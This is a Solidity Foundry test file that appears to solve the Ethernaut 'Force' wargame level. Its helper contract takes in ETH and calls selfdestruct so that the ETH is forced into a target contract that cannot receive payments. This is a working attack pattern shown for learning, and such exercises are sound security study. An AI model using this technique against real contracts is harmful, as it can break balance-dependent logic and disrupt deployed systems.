// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/Force.sol";

contract CounterTest is Test {
    Force public force;
    TemperarySelfDestructContract public attackContract;

    function setUp() public {
        force = new Force();
        attackContract = new TemperarySelfDestructContract();
    }

    function test_ForcefullySendingEth() public {
        assertEq(address(force).balance, 0);
        vm.deal(address(this), 1 ether);
        (bool status, ) = address(attackContract).call{value: 1 ether}("");
        assertEq(status == true ? 1 : 0, 1);
        attackContract.attack(payable(address(force)));
        assertEq(address(force).balance, 1 ether);
    }
}

contract TemperarySelfDestructContract {
    function attack(address payable _addr) external {
        // it will show warning but ignore that
        selfdestruct(_addr);
    }

    fallback() external payable {}

    receive() external payable {}
}
